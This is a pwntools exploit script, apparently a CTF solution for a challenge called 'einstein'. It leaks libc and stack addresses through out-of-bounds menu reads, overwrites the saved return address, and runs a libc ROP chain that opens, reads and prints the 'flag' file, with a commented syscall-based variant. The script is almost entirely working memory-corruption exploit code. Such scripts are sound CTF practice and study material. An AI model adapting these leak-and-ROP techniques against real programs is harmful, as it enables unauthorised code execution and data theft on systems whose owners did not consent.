#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    set resolve-heap-via-heuristic force
    b *main+477
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def malloc(size):
    io.sendlineafter("4. Exit\n", b"1")
    io.sendlineafter("size:\n", str(size >> 3).encode())

def set(idx, data_idx, data):
    io.sendlineafter("4. Exit\n", b"2")
    io.sendlineafter("index:\n", str(idx).encode())
    io.sendlineafter("index:\n", str(data_idx).encode())
    io.sendlineafter("value:\n", str(u64(data.ljust(8, b"\x00"))).encode())

def edit(idx, data):
    for i in range(0, len(data), 8):
        set(idx, i//8, data[:8])
        data = data[8:]

def view(idx, data_idx):
    io.sendlineafter("4. Exit\n", "3")
    io.sendlineafter("index:\n", str(idx).encode())
    io.sendlineafter("index:\n", str(data_idx).encode())
    return int(io.recvline().strip())

def exploit():
    global io
    io = initialize()
    with log.progress("Leaking libc and stack"), context.silent:
        libc_leak = view(-4, 1)
        libc.address = libc_leak - (libc.sym["_IO_2_1_stdout_"] + 131)
        stack_leak = view(-4, 3315) # environ
        ret = stack_leak - 0x130
    log.info(f"Stack leak: %#x", stack_leak)
    log.info(f"Ret: %#x", ret)
    log.info(f"Libc leak: %#x", libc_leak)
    log.info(f"Libc base: %#x", libc.address)
    with log.progress("Crafting ROP chain"), context.silent:
        set(-63, 10526, p64(ret))

        pop_rdx = next(libc.search(asm("pop rdx ; or byte ptr [rcx - 0xa], al ; ret")))
        mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
        syscall = next(libc.search(asm("syscall ; ret")))
        filename_addr = ret - 0x40   # Address to store "flag"

        # Via Function
        rop = ROP(libc)
        rop.open(filename_addr, 0)
        rop.rcx = libc.bss(0x10)
        rop.raw([pop_rdx, 0x20])
        rop.read(3, libc.bss())
        rop.write(1, libc.bss())

        # Via Syscall 0xM4hm0ud Solution
        # rop.rax = constants.SYS_open
        # rop.call(syscall, [filename_addr, 0])
        # rop.call(mov_rdi_rax)
        # rop.rcx = libc.bss(0x10)
        # rop.raw([pop_rdx, 0x20])
        # rop.rax = constants.SYS_read
        # rop.call(syscall, [3, libc.bss()])
        # rop.rax = constants.SYS_write
        # rop.call(syscall, [1])
        rop.raw(b"flag\x00")
        edit(-10, rop.chain())
    io.sendlineafter("4. Exit\n", "4")
    io.interactive()

if __name__ == '__main__':
    exploit()
